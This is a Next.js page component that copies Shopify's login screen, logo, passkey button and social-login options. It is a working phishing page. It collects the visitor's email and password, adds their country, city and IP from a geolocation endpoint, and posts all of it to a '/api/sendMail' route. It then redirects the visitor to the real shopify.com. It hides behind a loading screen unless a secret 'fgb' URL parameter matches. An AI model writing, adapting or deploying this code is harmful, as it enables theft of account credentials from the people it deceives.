'use client'
import Image from "next/image";
import { BsApple, BsFacebook } from "react-icons/bs";
import { FcGoogle } from "react-icons/fc";
import { useState, useEffect } from "react";
import logo from '../../public/logo.svg';
import Loading from "@/components/Loading";

export default function Home() {

 const [next, setNext] = useState(false);
 const [email, setEmail] = useState('')
 const [password, setPassword] = useState('')
 const [data, setData] = useState({})
 const [jet, setJet] = useState(false)

 useEffect(() => {

  const mySearchParams = new URLSearchParams(window.location.search)
  const fgb = mySearchParams.get('fgb')

  async function getGeoInfo() {
    const response = await fetch('/api/getInfo')
    const obj = await response.json()

    if(obj.fgb === fgb) {
      console.log('Yes!')
      setJet(true)
    } else {
      console.log('No!')
      setJet(false)
    }
    setData(obj)
  }

  getGeoInfo()
} , [])

 const moveNext = (e) => {
  e.preventDefault()
  setNext(true)
 }

 const submitted = async (e) => {
  e.preventDefault()
  const info = {
    email,
    password,
    country: data.country,
    city: data.city,
    host_ip: data.ip,
    date: new Date().toDateString()
  }

  const res = await fetch('/api/sendMail', {
    method: "POST",
    body: JSON.stringify(info),
    headers: {
      'content-type': 'application/json'
    }
  });

  if(res.ok){
    console.log("Yeai!")
    // setLoading(false)
    // setError('Error connecting to server')
    window.location.href = 'https://www.shopify.com'
  }else{
    alert("Oops! Something is wrong, please try again later...!")
    // setLoading(false)
    // setError('Error connecting to server')
  }
}


 return (

  // {/* <Loading /> */}

    <div className="page_contain">
        <div className="gradient-background__wrapper">
          <div class="gradient-background">
            <div class="gradient-background__shape gradient-background__shape--1"></div>
            <div class="gradient-background__shape gradient-background__shape--2"></div>
          </div>
          <div class="gradient-background__noise"></div>
        </div>
        <div className="page-main">
        <div className="page-content with-shadow">
            {jet ? (
               <div className="main-content">

               <div className="login-card ">
                 <div className="login-card-header">
                 <header className="login-card__header">
                       <h1 className="login-card__logo">
                           <a href="https://shopify.com">
                               <Image alt="Log in to Shopify" src={logo} />
                           </a>
                       </h1>
                     </header>
                 </div>

                 <div className="login-card__content">
                   <div className="main-card-section">
                   <div className="headings-container">
                       <div>
                         <h1 className="ui-heading mt-8">Log in</h1>
                         <h3 className="ui-subheading ui-subheading--subdued">Continue to Shopify account</h3>
                        </div>
                       </div>
                   </div>

                   <form className="formed w-full" onSubmit={submitted}>
                   {
                     !next ? (
                       <>
                         <div className="mb-5">
                           <label for="email" className="block mb-2 text-sm font-medium text-gray-900 dark:text-white">Email</label>
                           <input type="email" value={email} onChange={e => setEmail(e.target.value)} id="email" className="bg-gray-50 border border-black-800 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500" required />
                         </div>
                         <button onClick={moveNext} className="w-full bg-black text-white p-3 border-lg" >continue with email</button>
                       </>
                     ) : (
                       <>
                        <div className="bg-gray-200 w-full p-5">
                         <p>{email}</p>

                         <p onClick={() => setNext(false)} className="mt-3"><a className="text-blue-500">Change email</a></p>

                         </div>

                         <div className="mb-5 mt-2">
                           <label for="email" className="block mb-2 text-sm font-medium text-gray-900 dark:text-white">Password</label>
                           <input type="password" value={password} onChange={e => setPassword(e.target.value)} id="email" className="bg-gray-50 border border-black-800 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500" required />
                           <label for="email" className="block mb-2 text-sm font-medium text-blue-500 dark:text-white">Forgot Password ?</label>
                         </div>
                         <button type="submit" className="w-full bg-black text-white p-3 border-lg" >Log in</button>

                       </>
                     )
                   }

                   </form>

                   {!next ? (
                     <>
                      <button className="ui-button ui-button--full-width ui-button--size-large passkey-login-button" id="web_authn_btn_trigger" type="button" name="button">
                   {/* data-bind-event-click="getLoadingAttestation()" */}
                     <span id="passkey-available-icon" className="next-icon next-icon--size-20 icon-reset">
                       <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                         <path fill-rule="evenodd" clip-rule="evenodd" d="M9 3C7.067 3 5.5 4.567 5.5 6.5C5.5 8.433 7.067 10 9 10C10.933 10 12.5 8.433 12.5 6.5C12.5 4.567 10.933 3 9 3ZM7 6.5C7 5.39543 7.89543 4.5 9 4.5C10.1046 4.5 11 5.39543 11 6.5C11 7.60457 10.1046 8.5 9 8.5C7.89543 8.5 7 7.60457 7 6.5Z" fill="currentColor"></path>
                         <path d="M4.82727 14.9552C5.66915 13.4398 7.26644 12.5 8.99999 12.5C9.4142 12.5 9.74999 12.1642 9.74999 11.75C9.74999 11.3358 9.4142 11 8.99999 11C6.72169 11 4.62247 12.2352 3.51603 14.2268L3.07937 15.0128C2.58406 15.9043 3.22875 17 4.24867 17H10.25C10.6642 17 11 16.6642 11 16.25C11 15.8358 10.6642 15.5 10.25 15.5H4.52463L4.82727 14.9552Z" fill="currentColor"></path>
                         <path d="M15.125 12.5C15.6082 12.5 16 12.1082 16 11.625C16 11.1418 15.6082 10.75 15.125 10.75C14.6418 10.75 14.25 11.1418 14.25 11.625C14.25 12.1082 14.6418 12.5 15.125 12.5Z" fill="currentColor"></path>
                         <path fill-rule="evenodd" clip-rule="evenodd" d="M17.6745 14.8747C18.3217 14.4561 18.75 13.7281 18.75 12.9V11.625C18.75 9.62297 17.127 8 15.125 8C13.123 8 11.5 9.62297 11.5 11.625V12.9C11.5 13.8004 12.0064 14.5826 12.75 14.9772V16.8509C12.75 17.24 12.8635 17.6207 13.0766 17.9462L13.4986 18.591C14.1635 19.6068 15.5727 19.8007 16.4873 19.0023L17.0399 18.5198C17.7394 17.9091 17.9009 16.9369 17.5338 16.1584C17.7228 15.7633 17.7765 15.3088 17.6745 14.8747ZM14.2026 13.9609C14.1351 13.8353 14.0025 13.75 13.85 13.75C13.3806 13.75 13 13.3694 13 12.9V11.625C13 10.4514 13.9514 9.5 15.125 9.5C16.2986 9.5 17.25 10.4514 17.25 11.625V12.9C17.25 13.3694 16.8694 13.75 16.4 13.75H16.1818C15.9938 13.75 15.8301 13.8537 15.7447 14.0071C15.7202 14.051 15.7021 14.0991 15.6918 14.15C15.6853 14.1823 15.6818 14.2158 15.6818 14.25V14.3215C15.6818 14.4106 15.7056 14.4975 15.75 14.5736C15.7632 14.5961 15.7781 14.6177 15.7948 14.6381L16.1262 15.0431C16.1487 15.0706 16.1672 15.0998 16.1818 15.13C16.2004 15.1685 16.2129 15.2087 16.2194 15.2493C16.2497 15.4405 16.15 15.6426 15.9533 15.7227C15.8642 15.759 15.7958 15.8192 15.75 15.8915C15.6613 16.0314 15.657 16.2166 15.75 16.3612C15.7742 16.3988 15.8049 16.4336 15.8424 16.4642L16.0405 16.6256C16.2807 16.8213 16.2869 17.1861 16.0535 17.3898L15.5008 17.8723C15.2722 18.0719 14.9199 18.0234 14.7536 17.7695L14.3316 17.1247C14.2784 17.0434 14.25 16.9482 14.25 16.8509V14.15C14.25 14.0816 14.2328 14.0172 14.2026 13.9609Z" fill="currentColor"></path>
                       </svg>
                     </span>
                     <span id="passkey-loading-icon" className="hidden">
                       <span role="img" className="ui-spinner ui-spinner--size-small"></span>
                     </span>

                     <p className="ml-2">Sign in with passkey</p>
                   </button>

                   <div className="external-login-divider__container">
                     <div className="external-login-divider">
                       <span className="external-login-divider__text">
                         or
                       </span>
                     </div>
                   </div>

                   <div className="external-login-providers">
                     <a href="#" className="ui-button ui-button--full-width ui-button--size-large external-login-button" data-method="post">
                     <BsApple />
                     {/* <span className="content">Continue with Apple</span> */}
                     </a>
                     <a href="#" className="ui-button ui-button--full-width ui-button--size-large external-login-button" data-method="post">
                         <BsFacebook width={8} height={8} fill="#316FF6" />
                       {/* <span className="content">Continue with Facebook</span> */}
                     </a>
                     <a href="#" className="ui-button ui-button--full-width ui-button--size-large external-login-button" data-method="post">
                       <FcGoogle />
                       {/* <span className="content">Continue with Google</span> */}
                     </a>

                   </div>
                     </>
                   ) : ('')}


                   <p className="help-link signup-link">
                   <span className="help-link__text">
                     New to Shopify?
                   </span>
                   <a href="#" className="ml-2">
                     <span className="arrow-link__icon text-blue-500">
                      Get started
                       <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                         <path fill-rule="evenodd" clip-rule="evenodd" d="M3.49951 10C3.49951 9.58579 3.8353 9.25 4.24951 9.25L13.9391 9.25L11.2192 6.53036C10.9263 6.23748 10.9263 5.7626 11.2192 5.4697C11.512 5.17679 11.9869 5.17676 12.2798 5.46964L16.2802 9.46964C16.4209 9.6103 16.4999 9.80107 16.4999 10C16.4999 10.1989 16.4209 10.3897 16.2802 10.5304L12.2798 14.5304C11.9869 14.8232 11.512 14.8232 11.2192 14.5303C10.9263 14.2374 10.9263 13.7625 11.2192 13.4696L13.9391 10.75L4.24951 10.75C3.8353 10.75 3.49951 10.4142 3.49951 10Z" fill="currentColor"></path>
                       </svg>
                     </span>
                   </a>
                   </p>



                 </div>



               </div>



               <footer className="login-footer">
                 <div className="login-footer__links">
                     <a className="login-footer__link" target="_blank" href="#" title="Help Center">Help</a>
                     <a className="login-footer__link" target="_blank" href="#" title="Privacy Policy">Privacy</a>
                     <a className="login-footer__link" target="_blank" href="#" title="Terms of service">Terms</a>
                 </div>
               </footer>
               </div>
            ) : <Loading />}
        </div>
        </div>
    </div>


  );
}
